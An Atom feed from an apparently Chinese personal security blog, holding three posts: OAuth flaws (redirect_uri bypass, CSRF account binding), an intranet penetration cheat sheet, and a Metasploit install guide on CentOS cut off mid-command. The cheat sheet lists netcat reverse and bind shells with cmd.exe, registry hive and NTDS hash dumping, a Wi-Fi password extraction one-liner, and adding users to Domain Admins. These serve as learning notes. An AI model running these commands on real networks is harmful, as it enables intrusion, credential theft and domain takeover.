<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fengx 的博客</title>
  
  <subtitle>Fengx&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://feng4.github.io/"/>
  <updated>2019-09-02T04:41:03.066Z</updated>
  <id>https://feng4.github.io/</id>
  
  <author>
    <name>Fengx</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>OAuth的一点点理解</title>
    <link href="https://feng4.github.io/2019/09/02/OAuth%E7%9A%84%E4%B8%80%E7%82%B9%E7%82%B9%E7%90%86%E8%A7%A3/"/>
    <id>https://feng4.github.io/2019/09/02/OAuth的一点点理解/</id>
    <published>2019-09-02T02:39:18.844Z</published>
    <updated>2019-09-02T04:41:03.066Z</updated>
    
    <content type="html"><![CDATA[<h3 id="OAuth的原理和授权流程"><a href="#OAuth的原理和授权流程" class="headerlink" title="OAuth的原理和授权流程"></a>OAuth的原理和授权流程</h3><blockquote><p>OAuth(开发授权)是一个开放标准，它的意思是允许第三方网站在用户授权的前提下访问用户在某一网站上存储的各种私密信息（如照片，视频，联系人列表）等，而这种授权无需将用户名和密码提供给第三方应用，如我们常见的QQ登入、微信登入等。<br><br>目前我们常见的版本为OAuth2.0，OAuth2.0认证和授权的过程中存在四个非常重要的角色，它们分别是<code>Resource Owner：资源的拥有者，即用户</code>，<code>Client：第三方接入应用</code>，<code>Resource Server：数据获取的服务器</code>，<code>Authorization Server：认证服务器</code>。<br></p></blockquote><p><strong>OAuth2.0认证和授权的运行流程：</strong><br><br><img src="/imgs/oauth.jpg" alt="oauth"></p><blockquote><p>当Resource Owner(用户)访问Client(第三方接入应用)时，Client会要求用户进行授权，然后用户会连接到认证服务器进行授权，授权成功后认证服务器将会携带Auth Code重定向到Client，Client收到Auth Code后将会向认证服务器请求Access Token，然后认证服务器再返回Access Token，接下来Client就能拿到这个token去Resource server存取用户资源了。<br></p></blockquote><blockquote><p><strong>授权的四种模式：</strong><br><br>授权码模式（authorization code）、简化模式（implicit grant type）、密码模式（Resource Owner Password Credentials Grant）<br></p></blockquote><p><img src="/imgs/oauth-baidu.jpg" alt="oauth-baidu"></p><blockquote><p>图中我们可以看到，百度提供了QQ和微博两种第三方登入方式。这两个就是OAuth服务的提供平台，也即是<code>Authorization Server</code>，而百度就是<code>Client</code>。·、<code>Resource server</code>是QQ、微博。<br></p></blockquote><blockquote><p><strong>OAuth2.0的常见漏洞以及具体案例：</strong><br><br>是OAuth平台自身的漏洞，这类漏洞通常是由于OAuth提供者对redirect_uri这个参数的过滤不严，导致授权成功后跳转到非预期的域名，从而使认证码或token被泄露。<br></p></blockquote><blockquote><p><a href="https://shuimugan.com/bug/view?bug_no=59403" target="_blank" rel="noopener">wooyun-2014-059403</a>、<a href="https://shuimugan.com/bug/view?bug_no=59427" target="_blank" rel="noopener">wooyun-2014-059427</a>、<br><a href="https://shuimugan.com/bug/view?bug_no=59639" target="_blank" rel="noopener">wooyun-2014-059639</a>、<br><a href="https://shuimugan.com/bug/view?bug_no=59676" target="_blank" rel="noopener">wooyun-2014-059676</a>腾讯OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取.<br><br>看完了四个案例，我们来总结一下关于OAuth平台自身的漏洞的常见绕过方式：Bypass的思维导图如下所示：</p></blockquote><p><img src="/imgs/oauth-bypass.jpg" alt="oauth-bypass"></p><blockquote><p>OAuth2.0配合CSRF劫持第三方账号：<br></p></blockquote><blockquote><p>这类漏洞常见于绑定账号处，由于绑定请求处存在CSRF漏洞，导致该请求能被恶意伪造，使得受害者在不知情的情况下将自己的应用账号绑定到攻击者的账号上。<br></p></blockquote><p><img src="/imgs/oauth-csrf.png" alt="oauth-csrf"></p><blockquote><p>攻击者用自己的账号向服务器发送绑定请求来进行账号绑定，当认证完成后，OAuth提供方会返回给第三方一个auth code作为确认绑定的依据，并携带在一个URL中。当用户访问这个URL之后，就会完成绑定的最后操作。<br><br><a href="https://shuimugan.com/bug/view?bug_no=54888" target="_blank" rel="noopener">wooyun-2014-054888</a>天涯–新浪OAuth 2.0 redirect_uir CSRF 漏洞<br><br><a href="https://shuimugan.com/bug/view?bug_no=145396" target="_blank" rel="noopener">wooyun-2015-0145396</a>知乎某处OAuth的身份劫持漏洞<br></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;OAuth的原理和授权流程&quot;&gt;&lt;a href=&quot;#OAuth的原理和授权流程&quot; class=&quot;headerlink&quot; title=&quot;OAuth的原理和授权流程&quot;&gt;&lt;/a&gt;OAuth的原理和授权流程&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;OAuth(开发授权)是一
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://feng4.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="OAuth" scheme="https://feng4.github.io/tags/OAuth/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透基础知识</title>
    <link href="https://feng4.github.io/2019/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>https://feng4.github.io/2019/08/26/内网渗透基础知识/</id>
    <published>2019-08-26T05:04:42.762Z</published>
    <updated>2019-09-02T05:37:36.997Z</updated>
    
    <content type="html"><![CDATA[<h3 id="内网渗透基础知识"><a href="#内网渗透基础知识" class="headerlink" title="内网渗透基础知识"></a>内网渗透基础知识</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote><p>了解一下内网的ip分配。。。。。。<br></p></blockquote><blockquote><p>内网常用的三种ip：<br><br>A类 10.0.0.0–10.255.255.255<br><br>B类 172.16.0.0–172.31.255.255<br><br>C类 192.168.0.0–192.168.255.255<br></p></blockquote><p><strong>什么是域控制器</strong><br></p><blockquote><p>域控制器是指在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器（Domain Controller，简写为DC） <br></p></blockquote><blockquote><p>在域中拥有最高权限，它能对域中的所有计算机进行操作和管理。</p></blockquote><h4 id="一、内网中常用的系统命令"><a href="#一、内网中常用的系统命令" class="headerlink" title="一、内网中常用的系统命令"></a>一、内网中常用的系统命令</h4><p><strong>1.内网网络探测常用命令</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">tracert IP    //路由跟踪 </span><br><span class="line">route print    //打印路由表 </span><br><span class="line">arp -a          //列出本网段内所有活跃的IP地址 </span><br><span class="line">arp -s (ip + mac) //绑定mac与ip地址 </span><br><span class="line">arp -d (ip + mac) //解绑mac与ip地址 </span><br><span class="line">nbtscan -r 192.168.16.0/24  //通过小工具nbtscan扫描整个网络 </span><br><span class="line">netsh firewall show config    //查看防火墙策略 </span><br><span class="line">netsh firewall show state     //查看防火墙策略</span><br><span class="line">for /l %i in (1,1,255) do @ping 192.168.10.%i -w 1 -n 1 | find /i &quot;ttl&quot; //探测存活主机</span><br></pre></td></tr></table></figure><p><strong>2.windows操作命令</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">net group /domain                          //获得所有域用户组列表</span><br><span class="line">net group xxx /domain              //显示域中xxx组</span><br><span class="line">net group xxx /del /domain         //删除域中xxx组</span><br><span class="line">net group xxx nx /del /domain      //删除域内xxx组中的成员nx</span><br><span class="line">net group xxx /add /domain         //添加域中的群组xxx</span><br><span class="line">net group &quot;domain admins&quot; /domain  //获得域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; /domain //获得企业管理员列表</span><br><span class="line">net localgroup administrators /domain //获得域内置administrators组用户</span><br><span class="line">net group &quot;domain controllers&quot; /domain //获得域控制器列表</span><br><span class="line">net group &quot;domain computers&quot; /domain //获得所有域成员计算机列表</span><br><span class="line">net user /domain   //获得所有域用户列表</span><br><span class="line">net user xxx /domain //获得账户xxx的详细信息</span><br><span class="line">net accounts /domain //获得域密码策略设置，密码长短，错误锁定等信息</span><br><span class="line">net view /domain     //查询有几个域，查询域列表</span><br><span class="line">net view /domain:xxx //查看xxx域中的计算机列表</span><br><span class="line">nltest /domain_trusts  //获取域信任信息</span><br><span class="line">net user domain-admin /domain //查看域管理员登录时间，密码过期时间，是否有登录脚本，组分配等信息</span><br><span class="line">net config workstation  //查询机器属于哪个域</span><br><span class="line">net time /domain     //查询主域服务器的时间</span><br><span class="line">echo %logonserver%   //查看登入到这台服务器的计算机名</span><br><span class="line">net time \\192.168.1.1  //查询远程共享主机192.168.1.1的时间</span><br><span class="line">net use \\ip\ipc$ password /user:username@domain //ipc$域内连接</span><br><span class="line">net view \\xxx.ggg.com  //查看域控共享情况</span><br><span class="line">dir \\dc2.backlion.com\SYSVOL /s /a &gt; sysvol.txt  //列出sysvol日志记录 </span><br><span class="line">xcopy \\dc2.backlion.com\sysvol.txt sysvol.txt  /i  /e  /c//远程拷贝到本地sysvol日志 </span><br><span class="line">net user  /domain  bk bk123                 //修改域内用户密码，需要管理员权限 </span><br><span class="line">net  localgroup  administartors   SEZKL\backlion  /add     //将SEZKL域中的用户backlion添加到administrators组中 </span><br><span class="line">mstsc /admin                 //远程桌面登录到console会话解决hash无法抓出问题 </span><br><span class="line">gpupdate/force                  //更新域策略 </span><br><span class="line">psexec  \\192.168.1.3 -u administrator -p bk1234 -c gsecdump.exe -u //从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来 </span><br><span class="line">gsecdump  -a      //获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值 </span><br><span class="line">tasklist /S ip /U domain\username /P /V    //查看远程计算机进程列</span><br></pre></td></tr></table></figure><p>普通域用户提升为域管理员:<br><code>net group &quot;Domain Admins&quot; xxx /add /domain</code><br></p><p><strong>3.基本内网渗透命令</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all  //查看ip地址</span><br><span class="line">ipconfig /release //释放地址</span><br><span class="line">ipconfig /renew  //重新获取ip地址</span><br><span class="line">whoami  //查询账号用户名</span><br><span class="line">whoami /all  //查看sid值</span><br><span class="line">systeminfo  //查询系统以及补丁信息</span><br><span class="line">tasklist /svc  //查看进程</span><br><span class="line">taskkill /im 进程名称(cmd)  //结束进程</span><br><span class="line">taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)</span><br><span class="line">wmic qfe get hotfixid  //查看已安装的补丁</span><br><span class="line">wmic qfe list full /format:htable &gt; hotfixes.htm //详细的补丁安装</span><br><span class="line">wmic qfe     //查询补丁信息以及微软提供的下载地址</span><br><span class="line">net start    //查看当前运行的服务</span><br><span class="line">net user     //查看本地组的用户</span><br><span class="line">net localgroup administrators  //查看本机管理员组有哪些用户</span><br><span class="line">net use   //查看会话</span><br><span class="line">net session  //查看当前会话</span><br><span class="line">net share    //查看SMB指向的路径[即共享]</span><br><span class="line">wmic share get name,path   //查看SMB指向的路径</span><br><span class="line">wmic nteventlog get path,filename,writeable //查询系统日志文件存储位置 </span><br><span class="line">net use \\IP\ipc$  password  /user:username      //建立IPC会话（工作组模式） </span><br><span class="line">net use  z:  \\192.168.1.1      //建立映射到本机Z盘 </span><br><span class="line">net time \\172.16.16.2        //查询共享主机的是 </span><br><span class="line">at \\172.16.16.2 13:50 c:\windows\2009.exe      //在共享主机上执行 </span><br><span class="line">netstat  -ano      //查看开放的端口 </span><br><span class="line">netstat -an | find “3389”   //找到3389端口 </span><br><span class="line">net accounts      //查看本地密码策略 </span><br><span class="line">nbtstat –A ip      //netbiso查询 </span><br><span class="line">net view      //查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来 </span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%        //查看系统是32还是64位   </span><br><span class="line">set                              //查看系统环境设置变量 </span><br><span class="line">net start                     //查看当前运行的服务 </span><br><span class="line">wmic service list brief             //查看进程服务 </span><br><span class="line">wmic process list brief         //查看进程 </span><br><span class="line">wmic startup list brief       //查看启动程序信息 </span><br><span class="line">wmic product list brief           //查看安装程序和版本信息（漏洞利用线索） </span><br><span class="line">wmic startup list full         //识别开机启动的程序 </span><br><span class="line">wmic process where(description=&quot;mysqld.exe&quot;) &gt;&gt;mysql.log  //获取软件安装路径 </span><br><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan showprofiles&apos;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %jkey=clear  //一键获取wifi密码 </span><br><span class="line">if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) //查看是否支持posershell </span><br><span class="line">qwinsta                       //查看登录情况</span><br><span class="line">set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;set KB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;set KB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;set KB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;set KB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280)do @type a.txt|@find /i &quot;%i&quot;||@echo %%i% Not Installed!)&amp;del /f/q /a a.txt //windows未打补丁情况</span><br></pre></td></tr></table></figure><p><strong>4.导出注册表的命令</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive &amp; reg save hklm\system system.hive &amp; reg save hklm\security security.hive</span><br></pre></td></tr></table></figure><h4 id="二、内网测试中代理与端口转发"><a href="#二、内网测试中代理与端口转发" class="headerlink" title="二、内网测试中代理与端口转发"></a>二、内网测试中代理与端口转发</h4><p><strong>正向代理</strong><br><br><code>Lhost ——&gt; proxy ——&gt; Rhost</code><br><br><img src="/imgs/poxy.png" alt="正向代理"></p><p>Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。</p><p><img src="/imgs/poxy3.png" alt="正向代理"></p><p>正向代理就像一个跳板，比如ABC三个<br>IP，A能访问B，B能访问C，A不能访问C，那么，正向代理就是A去访问B，告诉B自己要访问C的什么内容，然后B去代替A来访问，接着把访问到的内容返回给A，这样就相当于A访问到了C。</p><p><strong>反向代理</strong><br><br><code>Lhost &lt;——&gt; proxy &lt;——&gt; firewall &lt;——&gt; Rhost</code><br><br><img src="/imgs/poxy2.png" alt="反向代理"></p><p>反向代理是我们经常用到的一种代理方式，因为它可以有效的穿透防火墙，这也是很多网站保护集群的一种做法，他们将内网中的web（A）代<br>理到外网的一台服务器（B）上，当用户访问这台服务器（B）时，他们以为自己访问的是原始的web（A）。</p><p><strong>windows lcx端口转发</strong><br></p><p>lcx常用命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1: -listen &lt;ConnectPort1&gt; &lt;TransmitPort2&gt;</span><br><span class="line">监听p1,接收由p2转发过来的数据 </span><br><span class="line">2: -tarn &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span><br><span class="line">端口转向功能，通过访问该端口可以直接与该主机或另一台主机的某一个端口进行通信</span><br><span class="line">3: -slave &lt;TransmitHostB&gt; &lt;PortB&gt; &lt;TransmitHostA&gt; &lt;PortA&gt; </span><br><span class="line">端口转发功能，将目标A机上的端口A,转发到外网B机的端口B上</span><br></pre></td></tr></table></figure></p><p>内网上执行：<br><code>lcx.exe –slave 192.168.100.101 8888 192.168.100.111 3389</code></p><p><strong>NC反弹CMDshell(netcat)</strong><br></p><blockquote><p>靶机上输入：<br><code>nc.exe -l -p 8888 -e cmd.exe</code><br>将cmd.exe转发到8888端口</p></blockquote><blockquote><p>攻击机输入：<br><code>nc.exe -nvv 192.168.100.101 8888</code><br>连接到靶机的8888端口(获取cmd.exe的执行权限)</p></blockquote><p><strong>反向连接：</strong></p><blockquote><p>攻击机输入：<br><code>nc.exe -l -p 8888</code><br>监听本地8888端口</p></blockquote><blockquote><p>靶机上输入：<br><code>nc.exe -e cmd.exe 192.168.100.100 8888</code><br>将靶机的cmd.exe转发到攻击机的8888端口</p></blockquote><h4 id="三、如何内网信息收集"><a href="#三、如何内网信息收集" class="headerlink" title="三、如何内网信息收集"></a>三、如何内网信息收集</h4><p>拿下边界机器后，我们首先要明白的是：这台边界机器在内网中处于什么地位，内网的架构是什么样子，判断有没有域，只要找到域控，拿下域控，便可以操控整个域。</p><p>首先我们获取当前组的计算机名 <code>net view</code> 这个命令可以查看同一域/工作组的计算机列表，</p><p>然后我们可以查看当前的计算机名、用户名、系统版本、工作站域、登<br>陆域等等</p><p>通过 <code>net view /domain</code> 这个命令我们可以看有哪些域。</p><p><strong>查询指定域列表:</strong></p><p><code>net view /domain:contoso</code></p><p><strong>通过计算机名获取其Ip地址:</strong></p><p><code>ping –n 1 DC1 -4</code></p><p><strong>Ping命令扫描计算机数量:</strong></p><p><code>for /l %i in (1,1,255) do @ping 192.168.100.%i -w 1 -n 1 | find /i &quot;ttl&quot;</code></p><p>以下命令在执行的时候会发送到域控中查询,如果渗透的机器不是域用户权限，则会出现报错（比如下面我们会创建一个linen用户）</p><p><img src="/imgs/内网.jpg" alt="内网1"></p><p><strong>查看域中的用户名:</strong></p><p><code>net user /domain</code></p><p><strong>查询域组名称：</strong></p><p> <code>net group /domain</code></p><p><strong>添加域管理员账号:</strong><br>我们先添加普通域用户<br><code>net user 用户名 密码 /add /domain</code></p><p>普通域用户提升为域管理员:</p><p><code>net group &quot;Domain Admins&quot; linen /add /domain</code></p><p><strong>查看域控制器:</strong></p><p><code>net group &quot;Domain controllers&quot;</code></p><p><strong>查询所有计算机名称:</strong></p><p><code>dsquery computer</code></p><p>寻找域控的方式有很多种方式。比如说一般的域控也是DNS<br>主机，我们看一下DNS的IP就能确定域控。又比如<code>net time /domain</code> 这个命令是通过时间服务器来寻找域控，又或者用命令<code>net group &quot;Domain Controllers&quot; /domain</code>来查找域控</p><p><img src="/imgs/内网2.jpg" alt="内网2"></p><h4 id="四、端口与服务"><a href="#四、端口与服务" class="headerlink" title="四、端口与服务"></a>四、端口与服务</h4><table><thead><tr><th style="text-align:center">端口号</th><th style="text-align:center">端口说明</th><th style="text-align:center">攻击技巧</th></tr></thead><tbody><tr><td style="text-align:center">21/22/69</td><td style="text-align:center">ftp/tftp：文件传输协议</td><td style="text-align:center">爆破\嗅探\溢出\后门</td></tr><tr><td style="text-align:center">22</td><td style="text-align:center">ssh：远程连接</td><td style="text-align:center">爆破OpenSSH；28个退格</td></tr><tr><td style="text-align:center">23</td><td style="text-align:center">telnet：远程连接</td><td style="text-align:center">爆破\嗅探</td></tr><tr><td style="text-align:center">25</td><td style="text-align:center">smtp：邮件服务</td><td style="text-align:center">邮件伪造</td></tr><tr><td style="text-align:center">53</td><td style="text-align:center">DNS：域名系统</td><td style="text-align:center">DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td></tr><tr><td style="text-align:center">67/68</td><td style="text-align:center">dhcp</td><td style="text-align:center">劫持\欺骗</td></tr><tr><td style="text-align:center">110</td><td style="text-align:center">pop3</td><td style="text-align:center">爆破</td></tr><tr><td style="text-align:center">139</td><td style="text-align:center">samba</td><td style="text-align:center">爆破\未授权访问\远程代码执行</td></tr><tr><td style="text-align:center">143</td><td style="text-align:center">imap</td><td style="text-align:center">爆破</td></tr><tr><td style="text-align:center">161</td><td style="text-align:center">snmp</td><td style="text-align:center">爆破</td></tr><tr><td style="text-align:center">389</td><td style="text-align:center">ldap</td><td style="text-align:center">注入攻击\未授权访问</td></tr><tr><td style="text-align:center">512/513/514</td><td style="text-align:center">linux r</td><td style="text-align:center">直接使用rlogin</td></tr><tr><td style="text-align:center">873</td><td style="text-align:center">rsync</td><td style="text-align:center">未授权访问</td></tr><tr><td style="text-align:center">1080</td><td style="text-align:center">socket</td><td style="text-align:center">爆破：进行内网渗透</td></tr><tr><td style="text-align:center">1352</td><td style="text-align:center">lotus</td><td style="text-align:center">爆破：弱口令\信息泄漏：源代码</td></tr><tr><td style="text-align:center">1433</td><td style="text-align:center">mssql</td><td style="text-align:center">爆破：使用系统用户登录\注入攻击</td></tr><tr><td style="text-align:center">1521</td><td style="text-align:center">oracle</td><td style="text-align:center">爆破：TNS\注入攻击</td></tr><tr><td style="text-align:center">2049</td><td style="text-align:center">nfs</td><td style="text-align:center">配置不当</td></tr><tr><td style="text-align:center">2181</td><td style="text-align:center">zookeeper</td><td style="text-align:center">未授权访问</td></tr><tr><td style="text-align:center">3306</td><td style="text-align:center">mysql</td><td style="text-align:center">爆破\拒绝服务\注入</td></tr><tr><td style="text-align:center">3389</td><td style="text-align:center">rdp</td><td style="text-align:center">爆破\Shift后门\0708</td></tr><tr><td style="text-align:center">4848</td><td style="text-align:center">glassfish</td><td style="text-align:center">爆破：控制台弱口令\认证绕过</td></tr><tr><td style="text-align:center">5000</td><td style="text-align:center">sybase/DB2</td><td style="text-align:center">爆破\注入</td></tr><tr><td style="text-align:center">5432</td><td style="text-align:center">postgresql</td><td style="text-align:center">缓冲区溢出\注入攻击\爆破：弱口令</td></tr><tr><td style="text-align:center">5632</td><td style="text-align:center">pcanywhere</td><td style="text-align:center">拒绝服务\代码执行</td></tr><tr><td style="text-align:center">5900</td><td style="text-align:center">vnc</td><td style="text-align:center">爆破：弱口令\认证绕过</td></tr><tr><td style="text-align:center">6379</td><td style="text-align:center">redis</td><td style="text-align:center">未授权访问\爆破：弱口令</td></tr><tr><td style="text-align:center">7001</td><td style="text-align:center">weblogic</td><td style="text-align:center">Java反序列化\控制台弱口令\控制台部署webshell</td></tr><tr><td style="text-align:center">80/443/8080</td><td style="text-align:center">web</td><td style="text-align:center">常见web攻击\控制台爆破\对应服务器版本漏洞</td></tr><tr><td style="text-align:center">8069</td><td style="text-align:center">zabbix</td><td style="text-align:center">远程命令执行</td></tr><tr><td style="text-align:center">9090</td><td style="text-align:center">websphere控制台</td><td style="text-align:center">爆破：控制台弱口令\Java反序列</td></tr><tr><td style="text-align:center">9200/9300</td><td style="text-align:center">elasticsearch</td><td style="text-align:center">远程代码执行</td></tr><tr><td style="text-align:center">11211</td><td style="text-align:center">memcacache</td><td style="text-align:center">未授权访问</td></tr><tr><td style="text-align:center">27017</td><td style="text-align:center">mongodb</td><td style="text-align:center">爆破\未授权访问</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;内网渗透基础知识&quot;&gt;&lt;a href=&quot;#内网渗透基础知识&quot; class=&quot;headerlink&quot; title=&quot;内网渗透基础知识&quot;&gt;&lt;/a&gt;内网渗透基础知识&lt;/h3&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://feng4.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>centos安装msf</title>
    <link href="https://feng4.github.io/2019/08/19/centos%E5%AE%89%E8%A3%85msf/"/>
    <id>https://feng4.github.io/2019/08/19/centos安装msf/</id>
    <published>2019-08-19T05:39:20.213Z</published>
    <updated>2019-08-19T08:24:54.275Z</updated>
    
    <content type="html"><![CDATA[<h3 id="centos安装msf的一个笔记"><a href="#centos安装msf的一个笔记" class="headerlink" title="centos安装msf的一个笔记"></a>centos安装msf的一个笔记</h3><p>以前都是使用kali的msf，没有自己安装过，现在我使用centos系统，了解一些安装过程。百度了一下安装的教程，跟着操作了一下。有一些坑。</p><h4 id="第一步、下载包"><a href="#第一步、下载包" class="headerlink" title="第一步、下载包"></a>第一步、下载包</h4><p><code>wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run</code><br></p><p>给予这个包执行的权限：<br><br><code>chmod +x metasploit-latest-linux-x64-installer.run</code><br></p><p>运行这个文件<code>./metasploit-latest-linux-x64-installer.run</code><br><br>之后基本回车就可以，有选择y/n的选y。<br><img src="centos安装msf/msf.png" alt="1231"></p><h4 id="第二步、安装postgresql"><a href="#第二步、安装postgresql" class="headerlink" title="第二步、安装postgresql"></a>第二步、安装postgresql</h4><p>由于msf需要使用postgresql，所以需要安装并配置它。这里是真的坑。搞得我还原了几次系统。</p><p>首先安装postgresql-server这个包：<br><code>yum install -y postgresql-server</code><br>安装完就开始配置了<br><strong>初始化数据库:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# postgresql-setup initdb</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# su - postgres</span><br><span class="line"></span><br><span class="line">-bash-4.2$ whoami</span><br><span class="line">postgres</span><br><span class="line"></span><br><span class="line">-bash-4.2$ pg_ctl -D /var/lib/pgsql/data start</span><br><span class="line">正在启动服务器进程</span><br><span class="line"></span><br><span class="line">-bash-4.2$ psql -p 5432</span><br><span class="line">psql (9.2.24)</span><br><span class="line">输入 &quot;help&quot; 来获取帮助信息.</span><br><span class="line"></span><br><span class="line">postgres=# \password postgres</span><br><span class="line">输入新的密码：</span><br><span class="line">再次键入：</span><br></pre></td></tr></table></figure><p><strong>创建msf用户和msf数据库：</strong></p><p>创建用户 msf，密码msf，数据库msf，赋予登入权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">postgres=# create user msf with password &apos;msf&apos;;</span><br><span class="line"></span><br><span class="line">postgres=# create database msf owner msf;</span><br><span class="line"></span><br><span class="line">postgres=# alter role msf login;</span><br></pre></td></tr></table></figure><p><code>\q</code>可以退出postgresql命令。<br></p><p><strong>修改配置文件 ，否则无法登录数据库：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# find / -name pg_hba.conf</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# vi /var/lib/pgsql/data/pg_hba.conf</span><br></pre></td></tr></table></figure></p><p><img src="centos安装msf/postgresql.png" alt="配置参数"></p><p>【注意】现在必须重启数据库:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# su - postgres</span><br><span class="line">上一次登录：一 8月 19 12:52:51 CST 2019pts/0 上</span><br><span class="line"></span><br><span class="line">-bash-4.2$ pg_ctl -D /var/lib/pgsql/data restart</span><br></pre></td></tr></table></figure><p>现在切换到root用户<br><br>使用这条命令查看新创建的用户是否可以连接数据库：<br></p><p><code>[root@localhost ~]# psql -U msf -d msf -h 127.0.0.1 -p 